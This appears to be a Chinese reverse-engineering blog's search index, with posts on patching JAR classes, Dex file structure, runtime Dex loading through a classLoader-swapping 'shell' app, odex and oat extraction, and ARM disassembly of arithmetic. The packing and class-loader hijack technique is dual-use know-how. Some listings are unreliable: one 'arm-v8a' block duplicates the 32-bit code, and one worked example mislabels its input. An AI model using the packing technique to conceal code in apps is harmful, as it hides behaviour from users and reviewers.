","date":"2021-10-01","objectID":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/:1:0","tags":["Jar"],"title":"Jar包修改","uri":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/"},{"categories":["奇技淫巧"],"content":"修改Jar包 将目标jar包拷贝到IDEA工程的lib目录下,然后右键lib目录,Add as Library. 在IDEA中右键Src目录,新建一个Java类 如: 目标类: com.android.xxx.a.class 新建类: com.android.xxx.a.java 用Jeb反编译目标class文件,拷贝到新建类中. 在新建类中进行修改. IDEA编译修改后的工程,找到编译出来的.class文件. 将Jar包用压缩软件解压,用编译出来的.class文件进行替换. cd到Jar包解压文件所在目录,利用jdk bin目录中的jar进行重新打包. jar cvf XXX.jar * //XXX.jar为要打包成的jar文件名 用新生成的Jar包替换之前的Jar即可. ","date":"2021-10-01","objectID":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/:2:0","tags":["Jar"],"title":"Jar包修改","uri":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/"},{"categories":["软件使用"],"content":"010Editor ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/:0:0","tags":["010Editor"],"title":"010Editor","uri":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/"},{"categories":["软件使用"],"content":"模板编写 ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/:1:0","tags":["010Editor"],"title":"010Editor","uri":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/"},{"categories":["软件使用"],"content":"帮助查询 ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/:1:1","tags":["010Editor"],"title":"010Editor","uri":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/"},{"categories":["软件使用"],"content":"示例 struct LuoHeader { int x \u003cformat=hex\u003e; //\u003cformat=hex\u003e 设置显示的进制 int y; }; Printf(\"Begin Parse\\n\"); //设置文件偏移, FSeek //FSeek(4); LuoHeader luoHeader; Printf(\"End Parse\\n\"); 010Editor导入模板后,按F5就可以解析了. ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/:1:2","tags":["010Editor"],"title":"010Editor","uri":"/posts/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/010editor/"},{"categories":["Android基础"],"content":"Dex ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:0","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"准备Dex文件 我们自己来编译一个Dex文件,供后面分析Dex文件格式. Hello.java public class Hello{ public static void main(String[] args){ System.out.println(\"Hello Dex!\"); } } Makefile脚本 all: javac Hello.java d8 Hello.class install: adb push classes.dex /data/local/tmp adb shell /system/bin/dalvikvm -cp /data/local/tmp/classes.dex Hello dalvikvm是Android虚拟机运行Dex的程序,真机中可能没有这个程序. 目前Android12.0虚拟机也没有这个程序,我测试用的是Android10.0 ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:1","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"文件格式 官方文件 在AndroidNDK低版本中存在,可以在线下载 http://androidxref.com/ Dex_文件格式.7z 类型说明 sleb128 源码 位于dalvik\\libdex\\Leb128.h中 DEX_INLINE int readSignedLeb128(const u1** pStream) { const u1* ptr = *pStream; int result = *(ptr++); if (result \u003c= 0x7f) { result = (result \u003c\u003c 25) \u003e\u003e 25; } else { int cur = *(ptr++); result = (result \u0026 0x7f) | ((cur \u0026 0x7f) \u003c\u003c 7); if (cur \u003c= 0x7f) { result = (result \u003c\u003c 18) \u003e\u003e 18; } else { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 14; if (cur \u003c= 0x7f) { result = (result \u003c\u003c 11) \u003e\u003e 11; } else { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 21; if (cur \u003c= 0x7f) { result = (result \u003c\u003c 4) \u003e\u003e 4; } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = *(ptr++); result |= cur \u003c\u003c 28; } } } } *pStream = ptr; return result; } 总结 从上面代码来看,先读取第一字节,判断其是否小于等于7f,如果小于等于,表示这个字节最高位为0,sleb128编码结束. 以解析0x7f为例. 0x807f对应的二进制为10000000 0111 1111 8位一组,首字节为0表示leb128编码结束,然后倒着将每组中的后7位重组 如本例中二进制重组为1111111 0000000这里有14位,要左移18位,然后右移18位(14 + 18 = 32)(如果有7位,就要左移25位,然后右移25位, 7 + 25 = 32), 注意最高位为符号位,右移的时候需要补1, 本例中左移18位,又右移18位后的二进制结果为1 111 1111 1111 1111 1111 1111 1000 0000 最高位是符号位,负数以补码形式存在,故取反加1后表示的真实数为-128 uleb128 源码 位于dalvik\\libdex\\Leb128.h中 DEX_INLINE int readUnsignedLeb128(const u1** pStream) { const u1* ptr = *pStream; int result = *(ptr++); if (result \u003e 0x7f) { int cur = *(ptr++); result = (result \u0026 0x7f) | ((cur \u0026 0x7f) \u003c\u003c 7); if (cur \u003e 0x7f) { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 14; if (cur \u003e 0x7f) { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 21; if (cur \u003e 0x7f) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = *(ptr++); result |= cur \u003c\u003c 28; } } } } *pStream = ptr; return result; } 总结 从上面代码来看,先读取第一个字节,并判断其是否大于0x7f,如果大于的话,则代表这个字节的最高位是1,而不是0. 如果是1的话,则代表还要读下一个字节;如果是0的话,则代表uleb128编码的数值到此为止. 以0x807f解析为例: 0x807f对应的二进制为1000 0000 0111 1111 8位一组,首字节为0表示leb128编码结束,然后倒着将每组中的后7位重组 如本例中二进制重组为1111111 0000000对应的16进制为0x3f80,对应的10进制就是16256 uleb128p1 在uleb128编码的基础上减1 格式预览 magic //固定8字节 ubyte[8] DEX_FILE_MAGIC = { 0x64 0x65 0x78 0x0a 0x30 0x33 0x35 0x00 } = \"dex\\n035\\0\" checksum adler32 checksum 如果修改Dex文件,需要修正这个值,否则会运行不起来. Dex_LuoFixDex.7z signature SHA-1,Android还不检测这个值,但如果我们修改了Dex文件,最好修下这个值. 先修这个Hash值,然后修checksum. file_size 如果修改了Dex文件大小,需要修正这个值,否则会运行不起来. header_size 头大小,固定为0x70. endian_tag 如果这个字段,按小尾方式读出来为0x12345678,那这整个Dex文件就是小尾方式 如果按大尾方式读出来为0x12345678,那这整个Dex文件就是大尾方式. link_size 附加数据大小. link_off 附加数据偏移. map_off map_list的偏移. string_ids_size 字符串项数,每项为DexStringId这个结构,大小为4字节. string_ids_off 字符串表偏移,指向DexStringId. /* * Direct-mapped \"string_id_item\". */ struct DexStringId { uint32_t stringDataOff;//字符串数据偏移,指向string_data_item结构 }; string_data_item struct string_data_item { uleb128 utf16_size; //字符串长度 ubyte[] data; //字符串数据 } 我们来解析来字符串表的第0项 type_ids_size 类型表项数,每项为DexTypeId这个结构,大小为4字节. type_ids_off /* * Direct-mapped \"type_id_item\". */ struct DexTypeId { uint32_t descriptorIdx; /* index into stringIds list for type descriptor */ }; 我们来解析下类型表的第0项 proto_ids_size 原型表项数,指向DexProtoId这个结构,大小为12字节. proto_ids_off 原型表偏移,指向DexProtoId. /* * Direct-mapped \"type_item\". */ struct DexTypeItem { uint16_t typeIdx; /* index into typeIds */ }; /* * Direct-mapped \"type_list\". */ struct DexTypeList { uint32_t size; /* #of entries in list */ DexTypeItem list[1]; /* entries */ }; /* * Direct-mapped \"proto_id_item\". */ struct DexProtoId { uint32_t shortyIdx; /* DexStringId列表的索引,方法签名字符串,由返回值和参数类型列表组合 */ uint32_t returnTypeIdx; /* DexTypeId的索引,返回值的类型 */ uint32_t parametersOff; /* 指向DexTypeList的偏移,参数类型列表 */ }; 我们来解析下原型表的第1项 field_ids_size 字段表项数,每项为DexFieldId这个结构,大小为8字节. field_ids_off 字段表偏移,指向DexFieldId. /* * Direct-mapped \"field_id_item\". */ struct DexFieldId { uint16_t classIdx; /* 类的类型,指向DexTypeId的索引,字段所属的类 */ uint16_t typeIdx; /* 字段类型,指向DexTypeId的索引,字段的类型 */ uint32_t nameIdx; /* 字段名,指向DexStringId的索引,字段的名称 */ }; 我们来解析下字段表的第0项 method_ids_size 方法表项数,每项为DexMethodId这个结构,大小为8字节. method_ids_off 方法表偏移,指向DexMethodId. /* * Direct-mapped ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:2","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"动态加载Dex文件 实验环境为Android7.0 API查询 public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent) //参数一: String dexPath, Dex文件路径 //参数二: String optimizedDirectory, Dex优化目录 // Android中内存中不会出现上述参数一的Dex文件, 会先优化,然后运行,优化后为.odex文件 //参数三: String librarySearchPath, 库搜索路径,jni有so文件 //参数四: ClassLoader parent, 类加载器 //如 java.lang.String 不在我们写的Dex文件中, //将一个类加载器定义为父亲,是说假如这个类我没有,那就去父亲那里找,父亲没有,那就去父亲的父亲那里去找 //getClassLoader(), 拿当前类加载器 //dalvik.system.DexClassLoader.getSystemClassLoader(), 拿系统类加载器 步骤 准备两个工程, LuoSrc为要加载的Dex文件工程, LuoPack为壳程序,动态加载上述Dex文件. 在LuoPack工程的资源中添加LuoSrc的Dex文件. 在LuoPack工程中添加LuoSrc的库. 新建一个jniLibs文件夹,将库放进去即可. 将LuoPack工程的资源文件替换为LuoSrc的资源(动态加载Dex文件,Dex中的代码可能会用到原来的资源文件). 在LuoPack工程中新建一个类,myApp继承Application. application的代码在MainActivity之前执行,常被用来不同类之间共享数据. 将LuoPack工程的AndroidManifest.xml文件替换为LuoSrc的(AndroidManifest.xml文件中可能记录了LuoSrc应用运行需要的权限). 在LuoPack工程中修改AndroidManifest.xml文件. 添加android:name=“org.example.luopack.myApp”,是为了向Android系统说明加载myApp(上面创建的类). 在LuoPack工程中的myApp类中重写attachBaseContext方法. 释放Dex文件. 反射替换classLoader 源码 package org.example.luopack; import android.app.Application; import android.content.Context; import java.io.File; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class myApp extends Application { @Override public void onCreate() { super.onCreate(); } @Override protected void attachBaseContext(Context base) { super.attachBaseContext(base); loadDex(base); } public void loadDex(Context base) { //释放Dex文件 String dexFilePath = ReleaseFile(base, \"classes.dex\", \"mydex\"); String odexFilePath = createFolder(base, \"myodex\"); DexClassLoader classLoader = new DexClassLoader(dexFilePath, odexFilePath, getApplicationInfo().nativeLibraryDir, getClassLoader()); //getClassLoader(), 拿的是当前类加载器, 里面没有org.example.luosrc.MainActivity这个类 //上述新new的classLoader里面有org.example.luosrc.MainActivity这个类 //让Android操作系统使用上述新new的classLoader即可 //反射替换classLoader //getClassLoader(), F7进去查看在哪里拿的classLoader //ContextImpl这个类中 try { Class clsContextImpl = Class.forName(\"android.app.ContextImpl\"); Field mPackageInfo = clsContextImpl.getDeclaredField(\"mPackageInfo\"); mPackageInfo.setAccessible(true); Object objLoadApk = mPackageInfo.get(getBaseContext()); Class clsLoadApk = Class.forName(\"android.app.LoadedApk\"); Field mClassLoader = clsLoadApk.getDeclaredField(\"mClassLoader\"); mClassLoader.setAccessible(true); mClassLoader.set(objLoadApk, classLoader); } catch (Exception e) { e.printStackTrace(); } } String createFolder(Context base, String strAndroidFolder) { File dir = base.getFilesDir(); File fileDir = new File(dir.getAbsoluteFile() + \"/\" + strAndroidFolder); if (!fileDir.exists()) { fileDir.mkdir(); } return fileDir.getAbsolutePath(); } //将要释放的文件放到assets目录下 String ReleaseFile(Context base, String strFileName, String strAndroidFolder) { InputStream is = null; FileOutputStream fos = null; File dexFile = null; try { is = getAssets().open(strFileName); File dir = base.getFilesDir(); File fileDir = new File(dir.getAbsoluteFile() + \"/\" + strAndroidFolder); if (!fileDir.exists()) { fileDir.mkdir(); } dexFile = new File(fileDir.getAbsoluteFile() + \"/\" + strFileName); fos = new FileOutputStream(dexFile); byte[] buffer = new byte[0x1000]; while (true) { int bytes = is.read(buffer); if (bytes \u003c= 0) { break; } fos.write(buffer, 0, bytes); } } catch (IOException e) { e.printStackTrace(); } finally { if (is != null) { try { is.close(); } catch (IOException e) { e.printStackTrace(); } } if (fos != null) { try { fos.close(); } catch (IOException e) { e.printStackTrace(); } } return dexFile.getAbsolutePath(); } } } Dex_动态加载Dex文件.7z ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:3","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"odex 实验环境为Android4.1 导出odex文件 将要查看的应用运行起来 进shell adb shell 列出进程列表 ps 查看模块列表 cat proc/2979/maps 这个文件实际上就是odex文件,可以在虚拟机中按此路径将该文件导出. 文件格式 比Dex文件多了一个头. odex转dex Dex_odex2dex.7z 将当前Android系统system/framework下的所有文件复制到本工具包的framework目录下. 将工具包里的123.odex文件替换为自己的odex文件. 双击odex2dex.bat文件即可. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:4","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"oat 实验环境为Android5.0 Android5.0以后使用ART虚拟机,在安装apk的时候,将dex文件变为汇编 也就是说优化后的odex文件直接变为汇编,这里的odex文件称为oat文件. 导出oat文件 文件格式 Android定制的Elf文件,原始Dex文件也包含在里面. 提取Dex文件 在oat文件中搜索文本035,找到dex035 将dex035之前的内容全部删除 按上述操作,就拿到了原始Dex文件. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:5","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"内存加载Dex文件 实验环境为Android5.0 不产生oat文件,一旦产生oat文件,可以直接提取出Dex文件. 研究思路 我们知道DexClassLoader这个Api的第一个参数是Dex文件的路径, 它内部会打开Dex文件,然后将Dex数据加载到内存,说明里面肯定有从内存加载的代码. 所以说我们应该查看Android源码,研究DexClassLoader这个Api的实现. Api追踪 我们重点跟踪Dex文件的路径,看Android源码是如何处理的. //http://androidxref.com/5.0.0_r2/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java public class DexClassLoader extends BaseDexClassLoader { public DexClassLoader(String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent) { //①DexClassLoader.java 57行 super(dexPath, new File(optimizedDirectory), libraryPath, parent); } } public class BaseDexClassLoader extends ClassLoader { private final DexPathList pathList; public BaseDexClassLoader(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent) { super(parent); //②BaseDexClassLoader.java 48行 this.pathList = new DexPathList(this, dexPath, libraryPath, optimizedDirectory); } } final class DexPathList { private static final String DEX_SUFFIX = \".dex\"; //这里地方Element 是个内部类 private final Element[] dexElements; public DexPathList(ClassLoader definingContext, String dexPath, String libraryPath, File optimizedDirectory) { //③DexPathList.java 109行 this.dexElements = makeDexElements(splitDexPath(dexPath), optimizedDirectory, suppressedExceptions); } private static Element[] makeDexElements(ArrayList\u003cFile\u003e files, File optimizedDirectory, ArrayList\u003cIOException\u003e suppressedExceptions) { //④DexPathList.java 223行 dex = loadDexFile(file, optimizedDirectory); if ((zip != null) || (dex != null)) { //⑫DexPathList.java 248行 //这里在使用dex这个值 elements.add(new Element(file, false, zip, dex)); //DexPathList.java 252行 return elements.toArray(new Element[elements.size()]); } private static DexFile loadDexFile(File file, File optimizedDirectory) throws IOException { //⑤DexPathList.java 265行 return DexFile.loadDex(file.getPath(), optimizedPath, 0); } //DexPathList.java 393行 static class Element { private final DexFile dexFile; //⑬DexPathList.java 402行 public Element(File file, boolean isDirectory, File zip, DexFile dexFile) { this.file = file; this.isDirectory = isDirectory; this.zip = zip; //dexFile存在Element的成员dexFile中 this.dexFile = dexFile; } } } } public final class DexFile { private long mCookie; static public DexFile loadDex(String sourcePathName, String outputPathName, int flags) { //⑥DexFile.java 151行 return new DexFile(sourcePathName, outputPathName, flags); } private DexFile(String sourceName, String outputName, int flags) { //⑦DexFile.java 111行 //⑭DexFile中的成员mCookie等价于OpenMemory的返回值 mCookie = openDexFile(sourceName, outputName, flags); } private static long openDexFile(String sourceName, String outputName, int flags) { //⑧DexFile.java 295行 return openDexFileNative(new File(sourceName).getAbsolutePath(), (outputName == null) ? null : new File(outputName).getAbsolutePath(), flags); } //⑨DexFile.java 308行, 这里可以看到是个jni函数 private static native long openDexFileNative(String sourceName, String outputName, int flags); } //dalvik_system_DexFile.cc 101行 static jlong DexFile_openDexFileNative(JNIEnv* env, jclass, jstring javaSourceName, jstring javaOutputName, jint) { //112行 std::unique_ptr\u003cstd::vector\u003cconst DexFile*\u003e\u003e dex_files(new std::vector\u003cconst DexFile*\u003e()); std::vector\u003cstd::string\u003e error_msgs; //⑩115行 这里可以看到关键在dex_files bool success = linker-\u003eOpenDexFilesFromOat(sourceName.c_str(), outputName.c_str(), \u0026error_msgs, dex_files.get()); } //dex_file.h // Opens .dex files found in the container, guessing the container format based on file extension. static bool Open(const char* filename, const char* location, std::string* error_msg, std::vector\u003cconst DexFile*\u003e* dex_files); // Opens .dex file, backed by existing memory static const DexFile* Open(const uint8_t* base, size_t size, const std::string\u0026 location, uint32_t location_checksum, std::string* error_msg) { //⑪dex_file.h 393行 return OpenMemory(base, size, location, location_checksum, NULL, error_msg); } Android虚拟机代码在libart.so这个库文件中,位于Android虚拟机 /sysytem/lib/libart.so 我们","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:6","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"AndroidStudio的坑 现象 通过Build编译的app so就正常打包进去,而通过run和debug模式的app就没有so文件. 解决办法 在有jnilibs so库的build.gradle文件中添加如下代码即可. buildTypes { debug { minifyEnabled true ndk { abiFilters \"armeabi\",\"armeabi-v7a\",\"x86\" } } release { minifyEnabled false proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro' } } ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:7","tags":["Dex"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"Arm逆向 这部分内容跟x86很大程度上都是一样的. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:0","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"加法 源代码 int main(int argc, char** argv){ 15 + 20; int n1 = 0; int n2 = 0; n1 = n1 + 1; n1 = 1 + 2; n1 = n1 + n2; printf(\"n1 = %d\\n\", n1); return 0; } arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR argc, =(aN1D - 0x2A0C) ; \"n1 = %d\\n\" .text:00002A06 MOVS argv, #3 .text:00002A08 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A0A BLX printf .text:00002A0E MOVS R0, #0 .text:00002A10 POP {R7,PC} .text:00002A10 ; End of function main arm-v8a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR argc, =(aN1D - 0x2A0C) ; \"n1 = %d\\n\" .text:00002A06 MOVS argv, #3 .text:00002A08 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A0A BLX printf .text:00002A0E MOVS R0, #0 .text:00002A10 POP {R7,PC} .text:00002A10 ; End of function main ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:1","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"减法 源代码 int main(int argc, char* argv[]){ int n1 = argc; int n2 = 0; scanf(\"%d\", \u0026n2); n1 = n1 - 100; n1 = n1 + 5 - n2; printf(\"n1 = %d\\n\", n1); return 0; } arm-v7a .text:00002A30 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A30 EXPORT main .text:00002A30 main ; DATA XREF: .text:000029EC↑o .text:00002A30 ; .got:main_ptr↓o .text:00002A30 .text:00002A30 var_10 = -0x10 .text:00002A30 var_C = -0xC .text:00002A30 .text:00002A30 argc = R0 ; int .text:00002A30 argv = R1 ; unsigned __int8 ** .text:00002A30 ; __unwind { .text:00002A30 PUSH {R4,R5,R7,LR} .text:00002A32 ADD R7, SP, #8 .text:00002A34 SUB SP, SP, #8 .text:00002A36 MOV R4, argc .text:00002A38 argc = R4 ; int .text:00002A38 LDR R0, =(__stack_chk_guard_ptr - 0x2A3E) .text:00002A3A ADD R0, PC ; __stack_chk_guard_ptr .text:00002A3C LDR R5, [R0] ; __stack_chk_guard .text:00002A3E LDR argv, [R5] .text:00002A40 LDR R0, =(aD - 0x2A4A) ; \"%d\" .text:00002A42 STR R1, [SP,#0x10+var_C] .text:00002A44 n1 = R4 ; int .text:00002A44 MOVS R1, #0 .text:00002A46 ADD R0, PC ; \"%d\" ; format .text:00002A48 STR R1, [SP,#0x10+var_10] .text:00002A4A MOV R1, SP .text:00002A4C BLX scanf .text:00002A50 argc = R4 ; int .text:00002A50 LDR R1, [SP,#0x10+var_10] .text:00002A52 n2 = R1 ; int .text:00002A52 LDR R0, =(aN1D - 0x2A5A) ; \"n1 = %d\\n\" .text:00002A54 SUBS n2, argc, n2 .text:00002A56 ADD R0, PC ; \"n1 = %d\\n\" .text:00002A58 SUBS R1, #0x5F ; '_' .text:00002A5A n1 = R1 ; int .text:00002A5A BLX printf .text:00002A5E LDR R0, [SP,#0x10+var_C] .text:00002A60 LDR R1, [R5] .text:00002A62 SUBS R0, R1, R0 .text:00002A64 ITTT EQ .text:00002A66 MOVEQ R0, #0 .text:00002A68 ADDEQ SP, SP, #8 .text:00002A6A POPEQ {argc,R5,R7,PC} .text:00002A6C BLX __stack_chk_fail .text:00002A6C ; End of function main 上述中的ITTT EQ指令中有3个T,表示接下来的3条指令是条件执行指令. IT EQ,这是thumb2的指令,是指令前缀. ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:2","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"乘法 源代码 int main(int argc, char* argv[]){ int n1 = argc; int n2 = argc; printf(\"n1 * 15 = %d\\n\", n1 *15); return 0; } arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 argc = R0 ; int .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 n2 = R0 ; int .text:00002A04 LDR R2, =(aN115D - 0x2A0E) ; \"n1 * 15 = %d\\n\" .text:00002A06 RSB.W argv, n2, n2,LSL#4 .text:00002A0A ADD R2, PC ; \"n1 * 15 = %d\\n\" .text:00002A0C MOV n2, R2 ; format .text:00002A0E BLX printf .text:00002A12 MOVS R0, #0 .text:00002A14 POP {R7,PC} .text:00002A14 ; End of function main ","date":"2021-09-12","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/:1:3","tags":["Arm"],"title":"Arm逆向","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm%E9%80%86%E5%90%91/"},{"categories":["Android基础"],"content":"除法 无符号 除数为2的幂(常量) 源代码 printf(\"argc / 8\", (unsigned int)argc / 8); arm-v7a .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 LDR R2, =(aArgc8 - 0x2A0C) ; \"argc / 8\" .text:00002A06 LSRS argv, argc, #3 .text:00002A08 ADD R2, PC ; \"argc / 8\" .text:00002A0A MOV argc, R2 ; format .text:00002A0C BLX printf .text:00002A10 MOVS R0, #0 .text:00002A12 POP {R7,PC} .text:00002A12 ; End of function main //右移3位 LSRS argv, argc, #3 arm-v8a .text:00000000000006A8 main ; DATA XREF: LOAD:0000000000000448↑o .text:00000000000006A8 ; .got:main_ptr↓o .text:00000000000006A8 .text:00000000000006A8 var_s0 = 0 .text:00000000000006A8 .text:00000000000006A8 argc = X0 ; int .text:00000000000006A8 argv = X1 ; unsigned __int8 ** .text:00000000000006A8 ; __unwind { .text:00000000000006A8 STP X29, X30, [SP,#-0x10+var_s0]! .text:00000000000006AC MOV X29, SP .text:00000000000006B0 LSR W1, W0, #3 .text:00000000000006B4 ADRL X0, aArgc8 ; \"argc / 8\" .text:00000000000006BC BL .printf .text:00000000000006C0 MOV W0, WZR .text:00000000000006C4 LDP X29, X30, [SP+var_s0],#0x10 .text:00000000000006C8 RET .text:00000000000006C8 ; } // starts at 6A8 .text:00000000000006C8 ; End of function main //右移3位 LSR W1, W0, #3 总结 x / 2^n = x \u003e\u003e n 除数为非2的幂(常量) MagicNumber无进位 源代码: printf(\"argc / 9\", (unsigned int)argc / 9); arm-v7a: .text:00002A00 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00002A00 EXPORT main .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 argv = R1 ; unsigned __int8 ** .text:00002A00 ; __unwind { .text:00002A00 PUSH {R7,LR} .text:00002A02 MOV R7, SP .text:00002A04 MOV R1, #0x38E38E39 .text:00002A0C UMULL.W argc, R1, argc, R1 .text:00002A10 LDR R0, =(aArgc9 - 0x2A16) ; \"argc / 9\" .text:00002A12 ADD R0, PC ; \"argc / 9\" .text:00002A14 LSRS R1, R1, #1 .text:00002A16 BLX printf .text:00002A1A MOVS R0, #0 .text:00002A1C POP {R7,PC} .text:00002A1C ; End of function main //R1 = c MOV R1, #0x38E38E39 //R1 = (argc * R1) \u003e\u003e 32 UMULL.W argc, R1, argc, R1 //R1 = R1 \u003e\u003e 1 LSRS R1, R1, #1 //R1 = (argc * c) \u003e\u003e 32 \u003e\u003e 1 arm-v8a: .text:00000000000006A8 main ; DATA XREF: LOAD:0000000000000448↑o .text:00000000000006A8 ; .got:main_ptr↓o .text:00000000000006A8 .text:00000000000006A8 var_s0 = 0 .text:00000000000006A8 .text:00000000000006A8 argc = X0 ; int .text:00000000000006A8 argv = X1 ; unsigned __int8 ** .text:00000000000006A8 ; __unwind { .text:00000000000006A8 STP X29, X30, [SP,#-0x10+var_s0]! .text:00000000000006AC MOV X29, SP .text:00000000000006B0 MOV W8, #0x38E38E39 .text:00000000000006B8 UMULL X8, W0, W8 .text:00000000000006BC ADRP argc, #aArgc9@PAGE ; \"argc / 9\" .text:00000000000006C0 LSR argv, X8, #33 ; '!' .text:00000000000006C4 ADD X0, X0, #aArgc9@PAGEOFF ; \"argc / 9\" .text:00000000000006C8 BL .printf .text:00000000000006CC MOV W0, WZR .text:00000000000006D0 LDP X29, X30, [SP+var_s0],#0x10 .text:00000000000006D4 RET .text:00000000000006D4 ; } // starts at 6A8 .text:00000000000006D4 ; End of function main //W8 = c MOV W8, #0x38E38E39 //X8 = argc * W8 //这里W0就是argc UMULL X8, W0, W8 //argv = X8 \u003e\u003e 33 LSR argv, X8, #33 总结: 上述特征为:x / y = x * c \u003e\u003e 32 \u003e\u003e n 还原的话就看c,分为3种情况: c为正数:y = 2^n / c c为负数:y = 2^n / (2^32 - c) c溢出: y = 2^n / (2^32 + c) 以上述arm-v7a为例: c = 0x38E38E39 = 954437177, 为正. n = 32 + 1 = 33 则 y = 2^33 / 954437177 = 9 MagicNumber有进位 源代码: printf(\"argc / 7\", (unsigned int)argc / 7); arm-v7a: .text:00002A00 main ; DATA XREF: .text:000029BC↑o .text:00002A00 ; .got:main_ptr↓o .text:00002A00 argc = R0 ; int .text:00002A00 